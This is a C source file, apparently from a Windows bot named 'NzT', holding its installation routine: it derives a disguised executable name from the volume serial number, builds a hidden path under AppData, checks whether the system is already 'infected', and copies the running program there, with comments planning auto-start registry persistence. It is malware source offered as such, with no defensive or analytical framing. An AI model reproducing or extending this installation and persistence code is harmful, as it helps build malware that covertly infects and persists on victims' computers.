#include <Windows.h>

#include "install.h"
#include "nzt.h"
#include "crt.h"
#include "utils.h"
#include "config.h"
#include "strings.h"
#include "globals.h"
#include "file.h"
#include "registry.h"

static DWORD GenerateBotFileName(PDWORD Seed)
{
	return(*Seed = 1664525 * (*Seed));
}

LPWSTR GetBotFileName(PDWORD Seed)
{
	DWORD	FileName	   = 0,
			FileNameLength = 0;
	wchar_t FileNameString[32] = { 0 };

	FileName = GenerateBotFileName(Seed);

	MemoryZero(&FileNameString, sizeof(FileNameString));

	if ((FileNameLength = API(wsprintfW)(FileNameString, L"%x", FileName)) > 0)
		return StringCopyW(FileNameString, FileNameLength);

	return NULL;
}

LPWSTR GetBotDirectory()
{
	LPWSTR AppData	     = NULL,
		   DirectoryName = NULL;
	BOOL   Status		 = FALSE;

	if ((DirectoryName = GetBotFileName(GetSerialNumber())) == NULL)
		return NULL;

	if ((AppData = GetDirectoryPath(PATH_APPDATA)) != NULL)
		Status = StringConcatW(&AppData, DirectoryName);

	Free(DirectoryName);

	if (!Status)
	{
		Free(AppData);
		AppData = NULL;
	}

	return AppData;
}

LPWSTR GetBotPath()
{
	LPWSTR	Directory = NULL,
			FileName  = NULL;
	BOOL	Status    = FALSE;

	if ((FileName = GetBotFileName(GetSerialNumber())) == NULL)
		return NULL;

	if ((Directory = GetBotDirectory()) != NULL)
		Status = StringConcatW(&Directory, WSTRING_BACKSLASH) && StringConcatW(&Directory, FileName) &&
		StringConcatW(&Directory, WSTRING_DOT_EXE);

	Free(FileName);

	if (!Status)
	{
		Free(Directory);
		Directory = NULL;
	}

	return Directory;
}

BOOL IsSystemInfected()
{
	BOOL   Infected = FALSE;
	LPWSTR Path		= NULL;

	if ((Path = GetBotPath()) == NULL)
		return FALSE;
	
	Infected = StringCompareW(g_BotInstallPath, Path);

	Free(Path);
	return Infected;
}

//setup auto-start registry
//persistence keys
//config keys
//setup dynamic config
BOOL InstallBot()
{
	LPWSTR	Path	  = NULL,
			Directory = NULL,
			Key		  = NULL,
			Config    = NULL;

	if ((Directory = GetBotDirectory()) == NULL)
		return FALSE;

	Path = GetBotPath();
	if (Path != NULL)
	{
		DosPathToNtPath(&Path);
		DosPathToNtPath(&Directory);

		if (FileCreateDirectory(Directory))
		{
			DosPathToNtPath(&g_CurrentProcessPath);
			FileCopy(g_CurrentProcessPath, Path, TRUE);
			DebugPrintW(L"NzT: Install location: %ls", Path);
			g_BotInstallPath = Path;
			return TRUE;
		}
	}

	DebugPrintW(L"NzT: Failed to install at :%ls", Path)

	return FALSE;
}

BOOL UninstallBot()
{
	LPWSTR Path = NULL,
		   Directory = NULL;

	return FALSE;
}